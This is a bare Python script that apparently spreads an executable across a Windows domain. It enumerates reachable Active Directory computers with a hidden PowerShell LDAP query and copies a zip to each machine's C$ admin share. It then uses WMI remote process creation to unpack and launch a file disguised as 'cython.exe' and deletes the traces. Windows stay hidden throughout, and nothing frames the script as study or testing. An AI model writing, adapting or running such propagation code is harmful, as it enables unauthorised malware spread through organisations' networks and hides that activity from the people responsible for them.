def main():
    import subprocess, time, os, zipfile
    FOLDER_PATH = r"C:\Temp\05ft8_2lthb4"
    ZIP_FILE_PATH = r"C:\Temp\05ft8_2lthb4.zip"
    EXECUTABLE_NAME = "cython.exe"
    
    def create_zip_from_folder(src, zip_path):
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(src):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, start=src)
                    zipf.write(full_path, arcname)
    
    create_zip_from_folder(FOLDER_PATH, ZIP_FILE_PATH)
    
    def get_ad_machines():
        current_machine = os.environ["COMPUTERNAME"]
        ps_command = (
            "$domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName; "
            "$ldapDomain = 'LDAP://DC=' + $domain.Replace('.', ',DC='); "
            "$searcher = New-Object DirectoryServices.DirectorySearcher; "
            "$searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry($ldapDomain); "
            "$searcher.Filter = '(objectClass=computer)'; "
            "$null = $searcher.PropertiesToLoad.Add('name'); "
            "$computers = $searcher.FindAll(); "
            "$connectedComputers = @(); "
            "foreach ($computer in $computers) { "
            "$computerName = $computer.Properties['name'][0]; "
            "if ($computerName -ne '" + current_machine + "' -and (Test-Connection -ComputerName $computerName -Count 1 -Quiet)) { "
            "$connectedComputers += $computerName; } }; "
            "$connectedComputers"
        )
        try:
            result = subprocess.run(
                ["powershell", "-Command", ps_command],
                capture_output=True, text=True, check=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        except subprocess.CalledProcessError:
            return []
    
    def retry_copy_zip(source, destination, retries=5, delay=2):
        source_dir = os.path.dirname(source)
        file_name = os.path.basename(source)
        for _ in range(retries):
            try:
                result = subprocess.run(
                    ["robocopy", source_dir, destination, file_name],
                    capture_output=True, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if result.returncode <= 7:
                    return True
            except Exception:
                pass
            time.sleep(delay)
        return False
    
    def transfer_and_execute(machine):
        destination = f"\\\\{machine}\\C$\\Temp"
        if not retry_copy_zip(ZIP_FILE_PATH, destination):
            return
        remote_cmd = (
            'cmd.exe /c powershell -NoProfile -Command "Expand-Archive -Path \\"C:\\Temp\\05ft8_2lthb4.zip\\" '
            '-DestinationPath \\"C:\\Temp\\05ft8_2lthb4\\" -Force; Start-Process \\"C:\\Temp\\05ft8_2lthb4\\{0}\\"; '
            'Remove-Item \\"C:\\Temp\\05ft8_2lthb4.zip\\" -Force"'
        ).format(EXECUTABLE_NAME)
        cmd = [
            "powershell", "-Command",
            "Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName {0} -ArgumentList '{1}'".format(machine, remote_cmd)
        ]
        subprocess.run(cmd, capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    machines = get_ad_machines()
    if not machines:
        print("Failure")
        return
    for m in machines:
        try:
            transfer_and_execute(m)
        except Exception:
            print("Error with machine " + m)
    try:
        os.remove(ZIP_FILE_PATH)
    except Exception:
        pass
    print("Success")

main()
